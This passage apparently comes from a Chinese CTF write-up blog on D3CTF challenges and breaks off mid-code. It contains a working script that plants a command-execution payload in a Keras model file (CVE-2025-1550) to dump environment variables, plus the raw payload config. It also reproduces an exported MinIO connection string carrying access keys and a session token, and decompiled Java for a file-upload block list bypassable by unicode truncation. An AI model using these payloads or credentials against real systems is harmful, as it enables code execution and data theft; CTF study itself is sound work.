+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export MC_HOST_d3invitation="http://NPO9XN9GE4MITLK9WCBB:KYOdEREHpVOnP2FCkxRn33vGL3azYoSyAUfY+U6R:eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJOUE85WE45R0U0TUlUTEs5V0NCQiIsImV4cCI6MTc0ODg3NDgxNiwicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlVIVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2S2lKZGZTeDdJa1ZtWm1WamRDSTZJa0ZzYkc5M0lpd2lRV04wYVc5dUlqcGJJbk16T2lvaVhTd2lVbVZ6YjNWeVkyVWlPbHNpWVhKdU9tRjNjenB6TXpvNk9pb2lYWDFkZlE9PSJ9.UVopT0BZzvHVLUIIofPpaPrBSEgf7U75ZHxAG_dr-iZXORS5fs8FvE6QZWqpBvC28E_VyIHGIrbC8TztFmJoMQ@35.241.98.126:31110"</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/733895f81f1994c716e3d52846d19967.png"></p>
+<hr>
+<h3 id="d3model"><a href="#d3model" class="headerlink" title="d3model"></a>d3model</h3><p><a target="_blank" rel="noopener" href="https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models">https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models</a></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import json</span><br><span class="line">import numpy as np</span><br><span class="line">import os</span><br><span class="line">from tensorflow.keras.models import Sequential</span><br><span class="line">from tensorflow.keras.layers import Dense</span><br><span class="line"></span><br><span class="line">model_name = "model.keras"</span><br><span class="line"></span><br><span class="line">x_train = np.random.rand(100, 28 * 28)</span><br><span class="line">y_train = np.random.rand(100)</span><br><span class="line"></span><br><span class="line">model = Sequential([Dense(1, activation='linear', input_dim=28 * 28)])</span><br><span class="line">model.compile(optimizer='adam', loss='mse')</span><br><span class="line">model.fit(x_train, y_train, epochs=5)</span><br><span class="line">model.save(model_name)</span><br><span class="line"></span><br><span class="line">with zipfile.ZipFile(model_name, "r") as f:</span><br><span class="line">    config = json.loads(f.read("config.json").decode())</span><br><span class="line"></span><br><span class="line">config["config"]["layers"][0]["module"] = "keras.models"</span><br><span class="line">config["config"]["layers"][0]["class_name"] = "Model"</span><br><span class="line">config["config"]["layers"][0]["config"] = {</span><br><span class="line">    "name": "mvlttt",</span><br><span class="line">    "layers": [</span><br><span class="line">        {</span><br><span class="line">            "name": "mvlttt",</span><br><span class="line">            "class_name": "function",</span><br><span class="line">            "config": "Popen",</span><br><span class="line">            "module": "subprocess",</span><br><span class="line">            "inbound_nodes": [{"args":[["bash", "-c", "env &gt; index.html"]], "kwargs": {"bufsize": -1}}]</span><br><span class="line">        }],</span><br><span class="line">    "input_layers": [["mvlttt", 0, 0]],</span><br><span class="line">    "output_layers": [["mvlttt", 0, 0]]</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">with zipfile.ZipFile(model_name, 'r') as zip_read:</span><br><span class="line">    with zipfile.ZipFile(f"tmp.{model_name}", 'w') as zip_write:</span><br><span class="line">        for item in zip_read.infolist():</span><br><span class="line">            if item.filename != "config.json":</span><br><span class="line">                zip_write.writestr(item, zip_read.read(item.filename))</span><br><span class="line"></span><br><span class="line">os.remove(model_name)</span><br><span class="line">os.rename(f"tmp.{model_name}", model_name)</span><br><span class="line"></span><br><span class="line">with zipfile.ZipFile(model_name, "a") as zf:</span><br><span class="line">    zf.writestr("config.json", json.dumps(config))</span><br><span class="line"></span><br><span class="line">print("[+] Malicious model ready")</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">    "config": {</span><br><span class="line">        "layers": [</span><br><span class="line">            {</span><br><span class="line">                "module": "keras.models",</span><br><span class="line">                "class_name":"Model",</span><br><span class="line">                "config":{"layers": [</span><br><span class="line">                {</span><br><span class="line">                    "module": "keras.models",</span><br><span class="line">                    "class_name":"Model",</span><br><span class="line">                    "config":{</span><br><span class="line">                        "name":"mvlttt", "layers":[</span><br><span class="line">                            {</span><br><span class="line">                                "name":"mvlttt",</span><br><span class="line">                                "class_name":"function",</span><br><span class="line">                                "config":"Popen",</span><br><span class="line">                                "module": "subprocess",</span><br><span class="line">                                "inbound_nodes":[{"args":[["bash", "-c", "env &gt; index.html"]],"kwargs":{"bufsize":-1}}]</span><br><span class="line">                            }],</span><br><span class="line">                                "input_layers":[["mvlttt", 0, 0]],</span><br><span class="line">                                "output_layers":[["mvlttt", 0, 0]]</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">            ]</span><br><span class="line">        }</span><br><span class="line">        }</span><br><span class="line">        ]</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h3 id="d3jtar"><a href="#d3jtar" class="headerlink" title="d3jtar"></a>d3jtar</h3><p>不安全的jsp解析，显然只要成功上传jsp 文件即可RCE</p>
+<blockquote>
+<p>在使用 jtar 的 TarOutputStream 打包文件时，它会把文件名中的 unicode 强制转化为 ascii 码， 从而发生字符截断。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="line">// (powered by FernFlower decompiler)</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">package d3.example.controller;</span><br><span class="line"></span><br><span class="line">import d3.example.utils.BackUp;</span><br><span class="line">import d3.example.utils.Upload;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Arrays;</span><br><span class="line">import java.util.HashSet;</span><br><span class="line">import java.util.Objects;</span><br><span class="line">import java.util.Set;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line">import org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line">import org.springframework.web.multipart.MultipartFile;</span><br><span class="line">import org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public class MainController {</span><br><span class="line">    public MainController() {</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @GetMapping({"/view"})</span><br><span class="line">    public ModelAndView view(@RequestParam String page, HttpServletRequest request) {</span><br><span class="line">        if (page.matches("^[a-zA-Z0-9-]+$")) {</span><br><span class="line">            String viewPath = "/WEB-INF/views/" + page + ".jsp";</span><br><span class="line">            String realPath = request.getServletContext().getRealPath(viewPath);</span><br><span class="line">            File jspFile = new File(realPath);</span><br><span class="line">            if (realPath != null &amp;&amp; jspFile.exists()) {</span><br><span class="line">                return new ModelAndView(page);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        ModelAndView mav = new ModelAndView("Error");</span><br><span class="line">        mav.addObject("message", "The file don't exist.");</span><br><span class="line">        return mav;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @PostMapping({"/Upload"})</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String UploadController(@RequestParam MultipartFile file) {</span><br><span class="line">        try {</span><br><span class="line">            String uploadDir = "webapps/ROOT/WEB-INF/views";</span><br><span class="line">            Set&lt;String&gt; blackList = new HashSet(Arrays.asList("jsp", "jspx", "jspf", "jspa", "jsw", "jsv", "jtml", "jhtml", "sh", "xml", "war", "jar"));</span><br><span class="line">            String filePath = Upload.secureUpload(file, uploadDir, blackList);</span><br><span class="line">            return "Upload Success: " + filePath;</span><br><span class="line">        } catch (Upload.UploadException var5) {</span><br><span class="line">            return "The file is forbidden: " + var5;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @PostMapping({"/BackUp"})</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String BackUpController(@RequestParam String op) {</span><br><span class="line">        if (Objects.equals(op, "tar")) {</span><br><span class="line">            try {</span><br><span class="line">                BackUp.tarDirectory(Paths.get("backup.tar"), Paths.get("webapps/ROOT/WEB-INF/views"));</span><br><span class="line">                return "Success !";</span><br><span class="line">            } catch (IOException var3) {</span><br><span class="line">                return "Failure : tar Error";</span><br><span class="line">            }</span><br><span class="line">        } else if (Objects.equals(op, "untar")) {</span><br><span class="line">            try {</span><br><span class="line">                BackUp.untar(Paths.get("webapps/ROOT/WEB-INF/views"), Paths.get("backup.tar"));</span><br><span class="line">                return "Success !";</span><br><span class="line">            } catch (IOException var4) {</span><br><span class="line">                return "Failure : untar Error";</span><br><span class="line">            }</span><br><span class="line">        } else {</span><br><span class="line">            return "Failure : option Error";</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="line">// (powered by FernFlower decompiler)</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">package d3.example.utils;</span><br><span class="line"></span><br><span class="line">import java.io.BufferedInputStream;</span><br><span class="line">import java.io.BufferedOutputStream;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.LinkOption;</span><br><span class="line">import java.nio.file.Path;</span><br><span class="line">import java.util.Collections;</span><br><span class="line">import java.util.List;</span><br><span class="line">import org.kamranzafar.jtar.TarEntry;</span><br><span class="line">import org.kamranzafar.jtar.TarInputStream;</span><br><span class="line">import org.kamranzafar.jtar.TarOutputStream;</span><br><span class="line"></span><br><span class="line">public class BackUp {</span><br><span class="line">    public BackUp() {</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public static void tarDirectory(Path outputFile, Path inputDirectory) throws IOException {</span><br><span class="line">        tarDirectory(outputFile, inputDirectory, Collections.emptyList());</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public static void tarDirectory(Path outputFile, Path inputDirectory, List&lt;String&gt; pathPrefixesToExclude) throws IOException {</span><br><span class="line">        FileOutputStream dest = new FileOutputStream(outputFile.toFile());</span><br><span class="line">        Path outputFileAbsolute = outputFile.normalize().toAbsolutePath();</span><br><span class="line">        Path inputDirectoryAbsolute = inputDirectory.normalize().toAbsolutePath();</span><br><span class="line">        int inputPathLength = inputDirectoryAbsolute.toString().length();</span><br><span class="line">        TarOutputStream out = new TarOutputStream(new BufferedOutputStream(dest));</span><br><span class="line">        Throwable var8 = null;</span><br><span class="line"></span><br><span class="line">        try {</span><br><span class="line">            Files.walk(inputDirectoryAbsolute).forEach((entry) -&gt; {</span><br><span class="line">                if (!Files.isDirectory(entry, new LinkOption[0])) {</span><br><span class="line">                    if (!entry.equals(outputFileAbsolute)) {</span><br><span class="line">                        try {</span><br><span class="line">                            String relativeName = entry.toString().substring(inputPathLength + 1);</span><br><span class="line">                            out.putNextEntry(new TarEntry(entry.toFile(), relativeName));</span><br><span class="line">                            BufferedInputStream origin = new BufferedInputStream(new FileInputStream(entry.toFile()));</span><br><span class="line">                            byte[] data = new byte[2048];</span><br><span class="line"></span><br><span class="line">                            int count;</span><br><span class="line">                            while((count = origin.read(data)) != -1) {</span><br><span class="line">                                out.write(data, 0, count);</span><br><span class="line">                            }</span><br><span class="line"></span><br><span class="line">                            out.flush();</span><br><span class="line">                            origin.close();</span><br><span class="line">                        } catch (IOException var8) {</span><br><span class="line">                            var8.printStackTrace();</span><br><span class="line">                        }</span><br><span class="line"></span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">            });</span><br><span class="line">        } catch (Throwable var17) {</span><br><span class="line">            var8 = var17;</span><br><span class="line">            throw var17;</span><br><span class="line">        } finally {</span><br><span class="line">            if (out != null) {</span><br><span class="line">                if (var8 != null) {</span><br><span class="line">                    try {</span><br><span class="line">                        out.close();</span><br><span class="line">                    } catch (Throwable var16) {</span><br><span class="line">                        var8.addSuppressed(var16);</span><br><span class="line">                    }</span><br><span class="line">                } else {</span><br><span class="line">                    out.close();</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public static void untar(Path outputDirectory, Path inputTarFile) throws IOException {</span><br><span class="line">        FileInputStream fileInputStream = new FileInputStream(inputTarFile.toFile());</span><br><span class="line">        Throwable var3 = null;</span><br><span class="line"></span><br><span class="line">        try {</span><br><span class="line">            untar(outputDirectory, (InputStream)fileInputStream);</span><br><span class="line">        } catch (Throwable var12) {</span><br><span class="line">            var3 = var12;</span><br><span class="line">            throw var12;</span><br><span class="line">        } finally {</span><br><span class="line">            if (fileInputStream != null) {</span><br><span class="line">                if (var3 != null) {</span><br><span class="line">                    try {</span><br><span class="line">                        fileInputStream.close();</span><br><span class="line">                    } catch (Throwable var11) {</span><br><span class="line">                        var3.addSuppressed(var11);</span><br><span class="line">                    }</span><br><span class="line">                } else {</span><br><span class="line">                    fileInputStream.close();</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public static void untar(Path outputDirectory, InputStream inputStream) throws IOException {</span><br><span class="line">        TarInputStream tarInputStream = new TarInputStream(inputStream);</span><br><span class="line">        Throwable var3 = null;</span><br><span class="line"></span><br><span class="line">        try {</span><br><span class="line">            TarEntry entry;</span><br><span class="line">            try {</span><br><span class="line">                while((entry = tarInputStream.getNextEntry()) != null) {</span><br><span class="line">                    byte[] data = new byte['耀'];</span><br><span class="line">                    File outputFile = new File(outputDirectory + "/" + entry.getName());</span><br><span class="line">                    if (!outputFile.getParentFile().isDirectory()) {</span><br><span class="line">                        outputFile.getParentFile().mkdirs();</span><br><span class="line">                    }</span><br><span class="line"></span><br><span class="line">                    FileOutputStream fos = new FileOutputStream(outputFile);</span><br><span class="line">                    BufferedOutputStream dest = new BufferedOutputStream(fos);</span><br><span class="line"></span><br><span class="line">                    int count;</span><br><span class="line">                    while((count = tarInputStream.read(data)) != -1) {</span><br><span class="line">                        dest.write(data, 0, count);</span><br><span class="line">                    }</span><br><span class="line"></span><br><span class="line">                    dest.flush();</span><br><span class="line">                    dest.close();</span><br><span class="line">                }</span><br><span class="line">            } catch (Throwable var17) {</span><br><span class="line">                var3 = var17;</span><br><span class="line">                throw var17;</span><br><span class="line">            }</span><br><span class="line">        } finally {</span><br><span class="line">            if (tarInputStream != null) {</span><br><span class="line">                if (var3 != null) {</span><br><span class="line">                    try {</span><br><span class="line">                        tarInputStream.close();</span><br><span class="line">                    } catch (Throwable var16) {</span><br><span class="line">                        var3.addSuppressed(var16);</span><br><span class="line">                    }</span><br><span class="line">                } else {</span><br><span class="line">                    tarInputStream.close();</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="line">// (powered by FernFlower decompiler)</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">package d3.example.utils;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.LinkOption;</span><br><span class="line">import java.nio.file.Path;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Set;</span><br><span class="line">import java.util.UUID;</span><br><span class="line">import org.springframework.util.StringUtils;</span><br><span class="line">import org.springframework.web.multipart.MultipartFile;</span><br><span class="line"></span><br><span class="line">public class Upload {</span><br><span class="line">    public Upload() {</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public static String secureUpload(MultipartFile file, String uploadDir, Set&lt;String&gt; blackList) throws UploadException {</span><br><span class="line">        try {</span><br><span class="line">            if (file.isEmpty()) {</span><br><span class="line">                throw new UploadException("File cannot be empty");</span><br><span class="line">            } else {</span><br><span class="line">                String originalFilename = file.getOriginalFilename();</span><br><span class="line">                checkFileNameSecurity(originalFilename);</span><br><span class="line">                checkFileTypeSecurity(originalFilename, file.getContentType(), blackList);</span><br><span class="line">                String safeFileName = generateSafeFileName(originalFilename);</span><br><span class="line">                Path uploadPath = Paths.get(uploadDir).normalize().toAbsolutePath();</span><br><span class="line">                if (!Files.exists(uploadPath, new LinkOption[0])) {</span><br><span class="line">                    Files.createDirectories(uploadPath);</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                Path targetPath = uploadPath.resolve(safeFileName);</span><br><span class="line">                file.transferTo(targetPath);</span><br><span class="line">                return safeFileName;</span><br><span class="line">            }</span><br><span class="line">        } catch (IOException var7) {</span><br><span class="line">            throw new UploadException("ERROR: " + var7.getMessage());</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    private static void checkFileNameSecurity(String fileName) throws UploadException {</span><br><span class="line">        if (fileName != null &amp;&amp; !fileName.isEmpty()) {</span><br><span class="line">            if (fileName.matches(".*[\\\\/$;:%\u0000].*")) {</span><br><span class="line">                throw new UploadException("File name contains forbidden character");</span><br><span class="line">            }</span><br><span class="line">        } else {</span><br><span class="line">            throw new UploadException("Invalid file name");</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    private static void checkFileTypeSecurity(String fileName, String contentType, Set&lt;String&gt; blackList) throws UploadException {</span><br><span class="line">        String fileExt = getFileExtension(fileName).toLowerCase();</span><br><span class="line">        if (blackList != null &amp;&amp; !blackList.isEmpty() &amp;&amp; blackList.contains(fileExt)) {</span><br><span class="line">            throw new UploadException("Forbidden type");</span><br><span class="line">        } else if (!isContentTypeValid(fileExt, contentType)) {</span><br><span class="line">            throw new UploadException("File content does not match the type");</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    private static String generateSafeFileName(String originalName) {</span><br><span class="line">        String ext = getFileExtension(originalName);</span><br><span class="line">        return UUID.randomUUID().toString() + "." + ext;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    private static String getFileExtension(String fileName) {</span><br><span class="line">        return StringUtils.getFilenameExtension(fileName);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    private static boolean isContentTypeValid(String fileExt, String contentType) {</span><br><span class="line">        if (contentType == null) {</span><br><span class="line">            return true;</span><br><span class="line">        } else {</span><br><span class="line">            String expectedType = getMimeTypeByExtension(fileExt);</span><br><span class="line">            return contentType.startsWith(expectedType);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    private static String getMimeTypeByExtension(String ext) {</span><br><span class="line">        switch (ext.toLowerCase()) {</span><br><span class="line">            case "jpg":</span><br><span class="line">            case "jpeg":</span><br><span class="line">                return "image/jpeg";</span><br><span class="line">            case "png":</span><br><span class="line">                return "image/png";</span><br><span class="line">            case "gif":</span><br><span class="line">                return "image/gif";</span><br><span class="line">            case "pdf":</span><br><span class="line">                return "application/pdf";</span><br><span class="line">            case "doc":</span><br><span class="line">                return "application/msword";</span><br><span class="line">            case "docx":</span><br><span class="line">                return "application/vnd.openxmlformats-officedocument.wordprocessingml.document";</span><br><span 